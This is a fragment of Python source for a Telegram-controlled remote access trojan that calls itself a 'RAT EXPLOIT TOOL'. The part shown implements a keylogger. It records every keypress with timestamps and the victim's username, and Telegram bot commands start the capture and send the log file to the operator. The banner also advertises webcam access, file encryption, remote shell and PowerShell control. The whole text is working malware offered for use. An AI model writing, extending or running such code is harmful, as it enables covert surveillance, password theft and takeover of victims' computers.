    global keystroke_buffer
    
    try:
        # Get current timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        
        # Format the key press
        if hasattr(key, 'char') and key.char:
            # Regular character key
            key_info = f"[{timestamp}] KEY: '{key.char}'"
        elif hasattr(key, 'name'):
            # Special key (ctrl, shift, etc.)
            key_info = f"[{timestamp}] KEY: {key.name.upper()}"
        else:
            # Unknown key
            key_info = f"[{timestamp}] KEY: {str(key)}"
        
        keystroke_buffer.append(key_info)
        
        # Also write to file immediately for safety
        if keystroke_file_path:
            try:
                with open(keystroke_file_path, 'a', encoding='utf-8') as f:
                    f.write(key_info + '\n')
            except Exception as e:
                print(f"Error writing to keystroke file: {e}")
                
    except Exception as e:
        print(f"Error processing key press: {e}")

def on_key_release(key):
    """Callback function for key release events - does nothing (we only want key presses)"""
    # We don't record key releases to avoid duplicates
    pass

def keystroke_worker():
    """Worker thread for keystroke capture"""
    global keystroke_active, keystroke_file_path
    
    try:
        # Create keystroke file
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        keystroke_file_path = f"{cd}/keystrokes_{timestamp}.txt"
        
        # Write header to file
        with open(keystroke_file_path, 'w', encoding='utf-8') as f:
            f.write(f"KEYSTROKE CAPTURE LOG\n")
            f.write(f"Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target System: {os.name}\n")
            f.write(f"User: {os.getenv('USERNAME', 'Unknown')}\n")
            f.write(f"{'='*50}\n\n")
        
        # Start listening for keystrokes
        with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
            listener.join()
            
    except Exception as e:
        print(f"Keystroke worker error: {e}")

@bot.message_handler(commands=['keystroke'])
def start_keystroke_capture(message):
    """Start keystroke capture"""
    global keystroke_active, keystroke_thread, keystroke_start_time
    
    user_id = message.from_user.id
    
    if not keystroke_active:
        keystroke_active = True
        keystroke_start_time = datetime.datetime.now()
        keystroke_thread = threading.Thread(target=keystroke_worker, daemon=True)
        keystroke_thread.start()
        
        # Wait a moment for the thread to start
        time.sleep(1)
        
        bot.send_message(user_id, f"🟢 KEYSTROKE CAPTURE STARTED!\n⌨️ Recording all keystrokes\n📁 Saving to: keystrokes_[timestamp].txt\n⏱️ Started: {keystroke_start_time.strftime('%H:%M:%S')}\n⚠️ Use /keystop to stop and get the file")
    else:
        bot.send_message(user_id, f"🟢 Keystroke capture is already ACTIVE!\n⏱️ Started: {keystroke_start_time.strftime('%H:%M:%S')}\n⌨️ Recording all keystrokes\n📁 Use /keystop to stop and get the file")

@bot.message_handler(commands=['keystop'])
def stop_keystroke_capture(message):
    """Stop keystroke capture and send the file"""
    global keystroke_active, keystroke_thread, keystroke_file_path, keystroke_start_time
    
    user_id = message.from_user.id
    
    if keystroke_active:
        keystroke_active = False
        
        # Stop the keyboard listener
        if keystroke_thread and keystroke_thread.is_alive():
            # We need to stop the listener thread
            try:
                # Force stop by setting active to False
                keystroke_thread.join(timeout=2)
            except:
                pass
        
        if keystroke_file_path and os.path.exists(keystroke_file_path):
            try:
                # Calculate duration
                duration = datetime.datetime.now() - keystroke_start_time
                duration_str = str(duration).split('.')[0]  # Remove microseconds
                
                # Get file size
                file_size = os.path.getsize(keystroke_file_path)
                file_size_kb = file_size / 1024
                
                # Count total keystrokes
                total_keystrokes = len(keystroke_buffer)
                
                # Send the keystroke file
                with open(keystroke_file_path, 'rb') as f:
                    caption = f"📁 KEYSTROKE CAPTURE COMPLETED\n\n⏱️ Duration: {duration_str}\n⌨️ Total Keystrokes: {total_keystrokes:,}\n📊 File Size: {file_size_kb:.1f} KB\n📅 Captured: {keystroke_start_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n📋 File contains all keystrokes with timestamps"
                    
                    bot.send_document(user_id, f, caption=caption)
                
                # Clean up
                try:
                    os.remove(keystroke_file_path)
                except:
                    pass
                
                keystroke_file_path = None
                keystroke_start_time = None
                keystroke_buffer.clear()
                
            except Exception as e:
                bot.send_message(user_id, f"❌ Error sending keystroke file: {str(e)}")
        else:
            bot.send_message(user_id, "❌ No keystroke file found to send.")
    else:
        bot.send_message(user_id, "❌ Keystroke capture is not currently active.")

@bot.message_handler(commands=['keystatus'])
def keystroke_status(message):
    """Check keystroke capture status"""
    user_id = message.from_user.id
    
    if keystroke_active:
        duration = datetime.datetime.now() - keystroke_start_time
        duration_str = str(duration).split('.')[0]
        total_keystrokes = len(keystroke_buffer)
        
        status_text = f"🟢 KEYSTROKE CAPTURE ACTIVE\n\n⏱️ Duration: {duration_str}\n⌨️ Keystrokes Captured: {total_keystrokes:,}\n📁 File: {os.path.basename(keystroke_file_path) if keystroke_file_path else 'Creating...'}\n⏰ Started: {keystroke_start_time.strftime('%H:%M:%S')}\n\n⚠️ Use /keystop to stop and get the file"
    else:
        status_text = "🔴 Keystroke capture is INACTIVE\n\n💡 Use /keystroke to start capturing"
    
    bot.send_message(user_id, status_text)


def send_welcome_message():
    """Send a friendly welcome message when the script starts"""
    welcome_text = """
🚀 RAT EXPLOIT TOOL STARTED SUCCESSFULLY!

🎯 Developed by: @vashu0100
⚡ Status: Online and Ready
🔐 Security: Active
📡 Connection: Established

💡 Features Available:
• 🔍 System Monitoring
• 📸 Screen Capture & Streaming
• 🎥 Webcam Access
• 🔐 File Encryption/Decryption
• ⌨️ Keystroke Logging
• 💻 Remote Shell Access
• 🌐 PowerShell Interface
• 📡 Network Tools
• 🛠️ System Control

Type /menu for main menu or /help for detailed commands
"""
    print(welcome_text)

try:
    if __name__ == "__main__":
        send_welcome_message()
        print('Waiting for commands...')
        try:
            bot.infinity_polling()
        except:
            time.sleep(10)
            pass    

except:
    time.sleep(5)
    pass        
